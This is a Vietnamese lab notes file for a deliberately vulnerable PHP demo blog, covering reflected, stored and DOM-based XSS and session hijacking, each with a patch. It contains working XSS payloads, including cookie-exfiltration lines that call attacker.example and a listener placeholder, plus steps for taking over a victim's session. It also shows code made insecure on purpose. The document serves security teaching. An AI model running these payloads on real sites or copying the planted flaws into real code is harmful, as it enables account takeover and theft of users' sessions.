# Ghi chú lỗ hổng & Bản vá — TechViet Blog

Tài liệu này **không nằm trong mã nguồn trang web** (giữ trang blog trông hoàn toàn bình thường đối với người ngoài). Dùng để đối chiếu khi viết phần "Biện pháp ngăn chặn" trong báo cáo, hoặc để tự vá lại ứng dụng sau khi demo xong.

---

## 1. Reflected XSS — `search.php`

**Vị trí lỗi:** dòng in tiêu đề kết quả tìm kiếm.

```php
echo '<h2 class="search-results-heading">Kết quả tìm kiếm cho "' . $q . '" (' . count($results) . ' bài viết)</h2>';
```

**Payload khai thác:**
```
http://<domain>/search.php?q=<script>alert(document.cookie)</script>
http://<domain>/search.php?q=<img src=x onerror=alert(1)>
```

**Bản vá:**
```php
<?php
// echo '<h2 class="search-results-heading">Kết quả tìm kiếm cho "' . $q . '" (' . count($results) . ' bài viết)</h2>';
echo '<h2 class="search-results-heading">Kết quả tìm kiếm cho "' . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . '" (' . count($results) . ' bài viết)</h2>';
?>
```

---

## 2. Stored XSS — `post.php` (phần bình luận)

**Vị trí lỗi:** vòng lặp hiển thị danh sách bình luận.

```php
  <?php foreach ($comments as $c): ?>
    <div class="comment-item">
      <?php
      echo '<span class="comment-name">' . $c['name'] . '</span>';
      echo '<span class="comment-date">' . date('d/m/Y H:i', strtotime($c['created_at'])) . '</span>';
      echo '<div class="comment-body">' . $c['comment'] . '</div>';
      ?>
    </div>
  <?php endforeach; ?>
```

**Payload khai thác:** nhập vào ô "Viết bình luận..."
```
<script>fetch('https://attacker.example/log?c='+document.cookie)</script>
```
→ Mã sẽ chạy với MỌI người xem bài viết đó về sau (đặc trưng của Stored XSS — tấn công dai dẳng, phạm vi rộng hơn Reflected).

**Bản vá:**
```php
<?php foreach ($comments as $c): ?>
    <div class="comment-item">
      <?php
      //echo '<span class="comment-name">' . $c['name'] . '</span>';
      echo '<span class="comment-name">' . htmlspecialchars($c['name'], ENT_QUOTES, 'UTF-8') . '</span>';
      echo '<span class="comment-date">' . date('d/m/Y H:i', strtotime($c['created_at'])) . '</span>';
      //echo '<div class="comment-body">' . $c['comment'] . '</div>';
      echo '<div class="comment-body">' . htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8') . '</div>';
      ?>
    </div>
  <?php endforeach; ?>
```

*(Tuỳ chọn nâng cao: nếu muốn cho phép định dạng cơ bản như in đậm/in nghiêng trong bình luận, dùng thư viện lọc HTML theo allow-list như HTML Purifier thay vì chỉ encode toàn bộ.)*

---

## 3. DOM-based XSS — `index.php` (bộ lọc bài viết theo lĩnh vực)

**Vị trí lỗi:** đoạn script cuối trang `index.php`, phần ghi nhãn "lĩnh vực đang lọc" từ URL vào `innerHTML`. Giá trị này **không được PHP đọc lại hay in ra**, nên toàn bộ luồng dữ liệu nằm hoàn toàn ở phía trình duyệt.

```javascript
// DỄ BỊ KHAI THÁC (hiện tại trong site):
var params = new URLSearchParams(window.location.search);
var category = params.get('category');
if (category) {
  var status = document.getElementById('filter-status');
  status.innerHTML = 'Đang lọc theo lĩnh vực: <strong>' + category + '</strong>'; // <-- sink
  ...
}
```

**Cách dùng bình thường:** chọn một lĩnh vực trong thẻ `<select>` (các `<option>` được sinh từ cột `category` của bảng `posts`) nằm ngang với tiêu đề "Bài viết mới nhất" → URL trở thành `index.php?category=kinh-te`, JavaScript sẽ ẩn các bài có `data-category` không khớp. Việc gán `select.value = category` chỉ là thuộc tính DOM (an toàn); điểm nguy hiểm vẫn là dòng ghi `innerHTML` ở trên.

**Payload khai thác:**
```
http://<domain>/index.php?category=<img src=x onerror=alert('DOM-XSS')>
```
Lỗi này **không hề đi qua server** — giá trị từ `window.location.search` được JavaScript đọc và ghi thẳng vào DOM, nên log server/WAF truyền thống rất dễ bỏ sót. Bộ lọc vẫn hoạt động như một tính năng thật: người dùng thấy nhãn "Đang lọc theo lĩnh vực: ..." và danh sách bài được thu hẹp, trong khi payload chèn thêm thẻ `<img>` thực thi ngay trên trình duyệt.

**Bản vá:**
```javascript
  var params = new URLSearchParams(window.location.search);
  var category = params.get('category') || '';
  var select = document.getElementById('category-filter');
  var status = document.getElementById('filter-status');

  // 1) Whitelist: chỉ nhận các lĩnh vực có thật trong <select>
  var allowed = [];
  if (select) {
    for (var k = 0; k < select.options.length; k++) {
      if (select.options[k].value) allowed.push(select.options[k].value);
    }
  }
  if (allowed.indexOf(category) === -1) category = '';

  if (select) {
    select.value = category;
    select.addEventListener('change', function () {
      window.location.href = this.value
        ? 'index.php?category=' + encodeURIComponent(this.value)
        : 'index.php';
    });
  }

  // 2) Ghi nhãn bằng textContent / text node, KHÔNG dùng innerHTML
  status.textContent = '';
  if (!category) {
    status.textContent = 'Hiển thị tất cả bài viết';
    return;
  }
  status.appendChild(document.createTextNode('Đang lọc theo lĩnh vực: '));
  var label = document.createElement('strong');
  var opt = select.querySelector('option[value="' + category + '"]');
  label.textContent = opt ? opt.textContent : category;
  status.appendChild(label);

  // 3) Lọc bằng thuộc tính hidden
  var cards = document.querySelectorAll('.post-card[data-category]');
  for (var i = 0; i < cards.length; i++) {
    cards[i].hidden = cards[i].getAttribute('data-category') !== category;
  }
```
*(An toàn hơn nữa: chuyển việc lọc sang server với prepared statement `WHERE category = ?`, và thêm header `Content-Security-Policy: script-src 'self'` để giảm tác động nếu còn sink khác lọt qua.)*

---

## 4. Chiếm quyền phiên đăng nhập (Session Hijacking) qua cookie bị đánh cắp

**Vị trí lỗi:** `config.php`

```php
// DỄ BỊ KHAI THÁC (hiện tại trong site):
ini_set('session.cookie_httponly', 0);  // cố ý tắt HttpOnly
session_start();
```

Vì `HttpOnly` bị tắt, `document.cookie` trong JavaScript đọc được session cookie (`PHPSESSID`) — kết hợp với bất kỳ lỗ hổng XSS nào ở trên (reflected/stored/DOM-based), kẻ tấn công có thể:

1. Chèn payload đánh cắp cookie, ví dụ:
   ```
   <img src=x onerror="fetch('https://<listener>/steal?c='+document.cookie)">
   ```
2. Nhận được giá trị `PHPSESSID` của nạn nhân.
3. Trên trình duyệt của kẻ tấn công: mở DevTools → tab **Storage/Application → Cookies**, sửa giá trị `PHPSESSID` thành giá trị vừa lấy được.
4. Tải lại trang `profile.php` → **đăng nhập thành công với tài khoản nạn nhân mà không cần biết mật khẩu** — chứng minh impact thực tế của XSS (account takeover), không chỉ dừng ở `alert()`.

**Bản vá:**
```php
session_set_cookie_params([
    'httponly' => true,   // JS không đọc được cookie nữa
    'secure'   => true,   // chỉ gửi cookie qua HTTPS
    'samesite' => 'Lax',  // giảm thiểu CSRF đi kèm
]);
session_start();
```
Sau khi vá, `document.cookie` sẽ **không còn chứa `PHPSESSID`** nữa dù trang vẫn còn lỗi XSS khác — đây là ví dụ điển hình của **phòng thủ theo lớp (defense in depth)**: dù lớp encoding bị bỏ sót ở đâu đó, lớp `HttpOnly` vẫn chặn được hệ quả nghiêm trọng nhất (đánh cắp phiên đăng nhập).

---

## 5. Biện pháp phòng chống tổng quát (áp dụng chung)

| Biện pháp | Mục đích |
|---|---|
| `htmlspecialchars()` khi xuất mọi dữ liệu người dùng ra HTML | Chặn Reflected & Stored XSS |
| Dùng `textContent` thay vì `innerHTML` khi xử lý dữ liệu từ URL/DOM phía client | Chặn DOM-based XSS |
| Header `Content-Security-Policy: default-src 'self'; script-src 'self'` | Giảm thiểu tác động nếu script độc lọt qua |
| Prepared statements (đã áp dụng sẵn trong site) | Chống SQL Injection đi kèm |
| `HttpOnly` + `Secure` cho cookie phiên đăng nhập (nếu có hệ thống login) | Giảm rủi ro bị đánh cắp cookie qua XSS |
| WAF (ví dụ ModSecurity + OWASP CRS) | Lớp phòng thủ bổ sung ở tầng hạ tầng |

## 6. Cách áp dụng bản vá nhanh cho toàn site

Không sửa thủ công từng dòng — có thể tạo file `www/security_patch.php` và `require` nó ở đầu `header.php`, hoặc thay thế trực tiếp 3 file `search.php`, `post.php` bằng các đoạn code đã vá ở trên rồi deploy lại qua `install_lamp.sh`.
